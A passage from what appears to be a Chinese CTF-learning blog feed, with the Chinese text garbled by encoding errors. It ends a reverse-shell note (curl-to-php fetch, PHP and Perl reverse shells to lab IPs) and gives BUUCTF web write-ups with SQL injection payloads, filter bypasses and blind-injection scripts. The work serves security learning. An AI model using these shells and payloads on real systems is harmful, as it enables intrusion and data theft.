class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp <span class="number">7777</span></span><br></pre></td></tr></table></figure><p>kaliï¼ˆæœåŠ¡ç«¯ï¼‰curlåå¼¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.202.129/shell.txt|php</span><br></pre></td></tr></table></figure><p>åå¼¹æˆåŠŸ</p><p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003132843970.png" alt="image-20201003132843970"></p><h3 id="å®éªŒ2-2"><a href="#å®éªŒ2-2" class="headerlink" title="å®éªŒ2"></a>å®éªŒ2</h3><p>winä¸Šç›‘å¬ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure><p>kaliä¸Šæ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("169.254.158.23",7777);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><p>åå¼¹æˆåŠŸ</p><p><img src="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003133806050.png" alt="image-20201003133806050"></p><h2 id="perlåå¼¹"><a href="#perlåå¼¹" class="headerlink" title="perlåå¼¹"></a>perlåå¼¹</h2><p>å’Œä¸Šé¢å‡ ä¸ªåå¼¹ä¸€æ ·</p><p>è¿™é‡Œåªåšä¸€ä¸‹æ¼”ç¤º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e 'use Socket;$i="169.254.158.23";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;</span><br></pre></td></tr></table></figure><h3 id="å®éªŒ-3"><a href="#å®éªŒ-3" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h3><p>åœ¨winä¸Šç›‘å¬ç«¯å£</p><p>åœ¨kaliä¸Šæ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e 'use Socket;$i="169.254.158.23";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;</span><br></pre></td></tr></table></figure><p>åå¼¹æˆåŠŸ</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>ä»¥ä¸Šéƒ½æ˜¯æœ€åŸºæœ¬çš„åå¼¹shell</p><p>å…¶å®åå¼¹shellè¿˜æ˜¯å¾ˆçµæ´»çš„ï¼Œå…·ä½“ä»€ä¹ˆæ ·çš„åœºæ™¯ä¸‹æ€ä¹ˆç”¨è¿˜éœ€è¦è‡ªå·±åˆ¤æ–­</p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æœ€è¿‘é‡åˆ°åå¼¹shellï¼Œæ€»ç»“ä¸€ä¸‹åå¼¹shellï¼Œç”¨æ¥åšç¬”è®°&lt;/p&gt;
&lt;h1 id=&quot;åå¼¹shell&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="ç¬”è®°" scheme="https://pz1o.top/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="CTF" scheme="https://pz1o.top/tags/CTF/"/>
    
    <category term="åå¼¹shell" scheme="https://pz1o.top/tags/%E5%8F%8D%E5%BC%B9shell/"/>
    
    <category term="æ€»ç»“" scheme="https://pz1o.top/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>BUUåˆ·é¢˜(Web)</title>
    <link href="https://pz1o.top/2020/09/27/BUU%E5%88%B7%E9%A2%98/"/>
    <id>https://pz1o.top/2020/09/27/BUU%E5%88%B7%E9%A2%98/</id>
    <published>2020-09-27T15:15:28.000Z</published>
    <updated>2020-11-20T14:18:05.259Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="BUU-Web"><a href="#BUU-Web" class="headerlink" title="BUU(Web)"></a>BUU(Web)</h1><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å…¶å®è‡ªå·±ä¼šåšå®Œé¢˜å†™ä¸€äº›wpï¼Œä½†å¥ˆä½•è‡ªå·±ä¸‰å¤©æ‘¸é±¼ä¸¤å¤©ä¼‘æ¯ï¼Œæ‰€ä»¥ä¸Šä¼ ä¸Šæ¥ç›‘ç£è‡ªå·±å­¦ä¹ </p><p>é¡ºä¾¿åˆ†ä¸€ä¸‹ç±»</p><h1 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h1><h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨ï¼ˆå †å æ³¨å…¥ï¼‰"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨ï¼ˆå †å æ³¨å…¥ï¼‰" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ï¼ˆå †å æ³¨å…¥ï¼‰"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ï¼ˆå †å æ³¨å…¥ï¼‰</h2><blockquote><p>å †å æ³¨å…¥ï¼š</p><p>åˆ†å·ï¼ˆï¼›ï¼‰æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚ç»“æŸä¸€ä¸ªsqlè¯­å¥å†ç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œå¯ä»¥ä¸€èµ·æ‰§è¡Œã€‚å †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚</p></blockquote><p>å…ˆæ¥äº†è§£ä¸€ä¸‹å †å æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; #</span><br><span class="line">1&#39; order by 2#</span><br><span class="line">1&#39; union select 1,2#</span><br></pre></td></tr></table></figure><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823154827319.png" alt="image-20200823154827319"></p><p>å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†å¤§å¤šæ•°è¯­å¥ï¼Œä½†æˆ‘ä»¬è¿˜æœ‰showï¼Œalertï¼Œrenameï¼Œdescç­‰</p><p>é€šè¿‡çœ‹è¡¨å¯ä»¥çœ‹è§ä¸¤ä¸ªè¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;desc words;#</span><br></pre></td></tr></table></figure><p>wordsè¡¨</p><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823155250757.png" alt="image-20200823155250757"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;desc &#96;1919810931114514&#96;;#  &#x2F;&#x2F;åœ¨mysqlä¸­æ•°å­—å‹éœ€è¦&#96;&#96;</span><br></pre></td></tr></table></figure><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823180812053.png" alt="image-20200823180812053"></p><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬å°±æ‰¾è§äº†flagï¼Œä½†é—®é¢˜æ˜¯æ€ä¹ˆæ‹¿å‡ºflagå‘¢ï¼Ÿ</p><p>ä¸‹é¢æ“ä½œæ˜¯éªšå§¿åŠ¿ï¼š</p><p>ä¸»è¦æ€æƒ³æ˜¯åˆ©ç”¨å›æ˜¾ä½ç½®æ¥å€’é€€è·å–flagï¼Œå›æ˜¾è‚¯å®šæ˜¯idåˆ°wordsè¡¨é‡Œé¢æ‰¾æ•°æ®ï¼Œç„¶åå›æ˜¾ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨æŸ¥è¯¢è¯­å¥ä¸å˜çš„å‰æä¸‹ï¼Œå°†flagå›æ˜¾å‡ºæ¥ï¼Ÿ</p><ul><li>æŠŠwordsè¡¨æ”¹åï¼ŒæŠŠæ•°å­—è¡¨æ”¹ä¸ºwordsï¼›</li><li>å¾€æ–°wordsè¡¨é‡Œé¢æ’å…¥ä¸€ä¸ªidå‚æ•°ï¼Œè¿™æ ·å›æ˜¾å°±å¯ä»¥æ‰¾åˆ°idï¼Œä»è€Œæ˜¾ç¤ºå‡ºflag</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,data from words where id&#x3D;&#39;id&#39;;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥flagè¿˜å¾—æ”¹æˆdata</p><p>æœ€ç»ˆpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename table words to word1;rename table &#96;1919810931114514&#96; to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823191000126.png" alt="image-20200823191000126"></p><p><strong>å¤ä¹ ä¸€ä¸‹mysqlæ“ä½œ</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#è¡¨é‡å‘½å</span><br><span class="line">rename table o_name to n_name;</span><br><span class="line">#æ–°å¢å­—æ®µ</span><br><span class="line">alert table table_name add column_name [type];</span><br><span class="line">#ä¿®æ”¹å­—æ®µå</span><br><span class="line">alert table table_name change o_name n_name [type];</span><br></pre></td></tr></table></figure><h2 id="SUCTF-2019-EasySQLï¼ˆå †å æ³¨å…¥ï¼‰"><a href="#SUCTF-2019-EasySQLï¼ˆå †å æ³¨å…¥ï¼‰" class="headerlink" title="[SUCTF 2019]EasySQLï¼ˆå †å æ³¨å…¥ï¼‰"></a>[SUCTF 2019]EasySQLï¼ˆå †å æ³¨å…¥ï¼‰</h2><p>è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œä½†ä¾ç„¶å¯ä»¥å †å æ³¨å…¥</p><p>æ‰¾åˆ°Flagè¡¨</p><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823214702265.png" alt="image-20200823214702265"></p><p>ä¹‹åå°±ä¸ä¼šåšäº†â€¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 1;set sql_mode&#x3D;pipes_as_concat;</span><br><span class="line">select 1||flag from Flag;</span><br></pre></td></tr></table></figure><blockquote><p>è¡¥å……ç³»ç»Ÿå˜é‡@@sql_modeï¼šæ˜¯ä¸€ç»„mysqlæ”¯æŒçš„åŸºæœ¬è¯­æ³•åŠæ ¡éªŒè§„åˆ™<br>PIPES_AS_CONCATï¼šå°†â€œ||â€è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œéæˆ–è¿ç®—ç¬¦ï¼Œä¹Ÿå’Œå­—ç¬¦ä¸²çš„æ‹¼æ¥å‡½æ•°Concatç›¸ç±»ä¼¼</p></blockquote><p>åŸæœ¬||æ˜¯orçš„æ„æ€ï¼Œè¿™é‡Œæ‹¼æ¥ä¹‹åï¼š</p><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823215540471.png" alt="image-20200823215540471"></p><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823215640962.png" alt="image-20200823215640962"></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h2><p>ç›´æ¥ä¸‡èƒ½å¯†ç ç™»å½•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1 %23&amp;password&#x3D;1&#39; or 1&#x3D;1%23</span><br></pre></td></tr></table></figure><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823221210961.png" alt="image-20200823221210961"></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h2><p>ç®€å•çš„sqlæ³¨å…¥</p><p>ç›´æ¥unionæ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())#</span><br><span class="line">1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;geekuser&quot;),(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;l0ve1ysq1&quot;)#</span><br><span class="line">1&#39; union select 1,(select group_concat(password) from geekuser),(select group_concat(password) from l0ve1ysq1)#</span><br></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQLï¼ˆè¿‡æ»¤å…³é”®å­—ï¼‰"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQLï¼ˆè¿‡æ»¤å…³é”®å­—ï¼‰" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQLï¼ˆè¿‡æ»¤å…³é”®å­—ï¼‰"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQLï¼ˆè¿‡æ»¤å…³é”®å­—ï¼‰</h2><p>åŒå†™ç»•è¿‡</p><p>æŸ¥å…³é”®å­—å¯ä»¥å…ˆselectè¯­å¥è§‚å¯Ÿå“ªäº›è¢«è¿‡æ»¤äº†ã€‚</p><p>å…¶ä¸­å…³é”®å­—æœ‰selectï¼Œunionï¼Œorï¼ˆåŒ…æ‹¬information,passwordï¼‰ï¼Œfromï¼Œwhereï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1&#39; ununionion selselectect  1,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;database()),3 #</span><br><span class="line">&#x2F;&#x2F;b4bsql,geekuser</span><br><span class="line">1&#39; ununionion selselectect  1,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;b4bsql&#39;),(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;geekuser&#39;) #</span><br><span class="line">&#x2F;&#x2F;id username password</span><br><span class="line">&#x2F;&#x2F;id username password</span><br><span class="line">1&#39; ununionion selselectect  1,(selselectect group_concat(username,passwoorrd) frfromom b4bsql),(selselectect group_concat(username,passwoorrd) frfromom geekuser) #</span><br><span class="line">flag&#123;1745650a-3c83-4068-a316-f2604dc9e366&#125;</span><br></pre></td></tr></table></figure><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-Worldï¼ˆè¿‡æ»¤å…³é”®å­—å’Œç©ºæ ¼çš„ç›²æ³¨ï¼‰"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-Worldï¼ˆè¿‡æ»¤å…³é”®å­—å’Œç©ºæ ¼çš„ç›²æ³¨ï¼‰" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack Worldï¼ˆè¿‡æ»¤å…³é”®å­—å’Œç©ºæ ¼çš„ç›²æ³¨ï¼‰"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack Worldï¼ˆè¿‡æ»¤å…³é”®å­—å’Œç©ºæ ¼çš„ç›²æ³¨ï¼‰</h2><p>ç®€å•æµ‹è¯•äº†ä¸€ä¸‹</p><p>å‘ç°ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œunionã€andã€orä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œå¹¶ä¸”å‘ç°åˆ—æœ‰ä¸¤åˆ—ï¼ŒæŠ¥é”™åªå‡ºboolï¼Œäºæ˜¯å°±æƒ³åˆ°æ˜¯ä¸æ˜¯ç›²æ³¨ï¼Œä½†é¦–è¦é—®é¢˜æ˜¯æ€ä¹ˆç»•è¿‡ç©ºæ ¼</p><p>ä»¥ä¸‹æœ‰å‡ ç§ç»•ç©ºæ ¼çš„åŠæ³•</p><blockquote><p>/**/ ï¼ˆï¼‰ %0a `` tab</p></blockquote><p>è¿™é‡Œæˆ‘ä»¬ç”¨ï¼ˆï¼‰æ¥ç»•è¿‡ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">dic =<span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">url = <span class="string">"http://fb5af086-8bde-4cdd-8d2e-fcc9fdbe523a.node3.buuoj.cn/index.php"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        payload = <span class="string">"if((mid((select(flag)from(flag)),&#123;0&#125;,1)='&#123;1&#125;'),1,2)"</span>.format(i,j)</span><br><span class="line">        data = &#123;<span class="string">"id"</span>: payload,&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(payload)</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ‹¿åˆ°flag</span><br><span class="line">flag&#123;3ba1b350-3474-44d2-a3cd-52f61aaeca64&#125;</span><br></pre></td></tr></table></figure><p>ä½†æˆ‘è‡ªå·±å†™çš„è„šæœ¬å¾ˆè¯¡å¼‚ï¼Œæ— æ³•æ£€æµ‹åˆ°-ï¼Œåªèƒ½é€šè¿‡payloadå€’æ¨</p><p>æ‰€ä»¥åˆæ¢äº†ä¸€ä¸ªå†™äº†ä¸€ä¸‹,ç”¨asciiå­—ç¬¦æ¥åˆ¤æ–­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">dic =<span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">url = <span class="string">"http://fb5af086-8bde-4cdd-8d2e-fcc9fdbe523a.node3.buuoj.cn/index.php"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">"if(ascii(mid((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,2)"</span>.format(i,j);</span><br><span class="line">        data = &#123;<span class="string">"id"</span>: payload,&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(payload)</span><br><span class="line">            flag += str(chr(j))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><p>åˆšå†™è„šæœ¬ï¼Œå¯¹å…¶ä¸­åŸç†è¿˜ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œå¸Œæœ›åç»­èƒ½æ·±å…¥å­¦ä¹ py</p><h1 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h1><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Havefun"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Havefun" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</h2><p>ç›´æ¥çœ‹æºç </p><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823222031931.png" alt="image-20200823222031931"></p><p>æ‹¿flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat&#x3D;dog</span><br></pre></td></tr></table></figure><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823222049635.png" alt="image-20200823222049635"></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h2><p>ä¸»è¦è¯´ä¸€ä¸‹ä¸¤ä¸ªå‡½æ•°</p><p><strong>strcmp()</strong></p><blockquote><p>strcmp()å‡½æ•°åªæœ‰åœ¨ç›¸ç­‰çš„æƒ…å†µä¸‹è¿”å›0ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªæ•°ç»„ï¼Œå®ƒä¼šè¿”å›NULLï¼Œè€Œåˆ¤æ–­ä½¿ç”¨äº†== ï¼Œè€ŒNULL==0æ˜¯bool(true)ï¼Œè¿™æ ·å°±æˆåŠŸç»•è¿‡ã€‚</p></blockquote><p><strong>is_numeric()</strong></p><blockquote><p>is_numeric() åˆ¤æ–­å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œä¸ä»…æ£€æŸ¥10è¿›åˆ¶ï¼Œ16è¿›åˆ¶ä¹Ÿå¯ä»¥ã€‚<br>is_numericå‡½æ•°å¯¹äºç©ºå­—ç¬¦%00ï¼Œæ— è®ºæ˜¯%00æ”¾åœ¨å‰åéƒ½å¯ä»¥åˆ¤æ–­ä¸ºéæ•°å€¼ï¼Œè€Œ%20ç©ºæ ¼å­—ç¬¦åªèƒ½æ”¾åœ¨æ•°å€¼åã€‚æ‰€ä»¥ï¼ŒæŸ¥çœ‹å‡½æ•°å‘ç°è¯¥å‡½æ•°å¯¹äºç¬¬ä¸€ä¸ªç©ºæ ¼å­—ç¬¦ä¼šè·³è¿‡ç©ºæ ¼å­—ç¬¦åˆ¤æ–­ï¼Œæ¥ç€åé¢çš„åˆ¤æ–­ï¼<br>è¯¥å‡½æ•°è¿˜å¯èƒ½é€ æˆsqlæ³¨å…¥ï¼Œä¾‹å¦‚å°†â€˜1 or 1â€™è½¬æ¢ä¸º16è¿›åˆ¶å½¢å¼ï¼Œå†ä¼ å‚ï¼Œå°±å¯ä»¥é€ æˆsqlæ³¨å…¥</p></blockquote><p>ä¹‹åå°±æ˜¯æ”¹cookieï¼Œpostè¿›passwordå’Œmoney</p><p>è¿™é‡Œåˆ¤æ–­moneyç›¸ç­‰ç”¨çš„æ˜¯strcmp()æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨æ•°ç»„ç»•è¿‡</p><h2 id="BJDCTF2020-Easy-MD5ï¼ˆffifdyopï¼‰"><a href="#BJDCTF2020-Easy-MD5ï¼ˆffifdyopï¼‰" class="headerlink" title="[BJDCTF2020]Easy MD5ï¼ˆffifdyopï¼‰"></a>[BJDCTF2020]Easy MD5ï¼ˆ<strong>ffifdyop</strong>ï¼‰</h2><p>å‘äº†å‡ ä¸ªæ•°å­—åæ²¡å‘ç°ä»€ä¹ˆä¸œè¥¿ï¼Œç„¶åæŠ“åŒ…ï¼Œçœ‹è§hint</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#39;admin&#39; where password&#x3D;md5($pass,true)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæƒ³è¦ç»•è¿‡çš„è¯è‚¯å®šæ˜¯æ‰¾ä¸‡èƒ½å¯†ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;&#39;&#39; or &#39;123&#39;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯ç”¨çš„æ˜¯<strong>ffifdyop</strong>MD5åŠ å¯†åä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or&#39;6Ã‰]â„¢Ã©!r,Ã¹Ã­b</span><br></pre></td></tr></table></figure><p>ç¬¦åˆä¸‡èƒ½å¯†ç </p><p>è¿›å…¥ä¸‹ä¸€å…³</p><p>æºç å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; $GET[&#39;a&#39;];</span><br><span class="line">$b &#x3D; $_GET[&#39;b&#39;];</span><br><span class="line"></span><br><span class="line">if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123;</span><br><span class="line">    &#x2F;&#x2F; wow, glzjin wants a girl friend.</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå¯ä»¥æ‹¿æ•°ç»„è¿‡ï¼Œä¹Ÿå¯ä»¥æ‰¾ä¸€äº›ç‰¹æ®Šçš„å¦‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure><p>ä»–ä»¬çš„MD5éƒ½æ˜¯0</p><p>æœ€åä¸€å…³æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#39;param1&#39;]!&#x3D;&#x3D;$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;param2&#39;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ‹¿æ•°ç»„ç»•è¿‡å°±å¥½</p><p><img 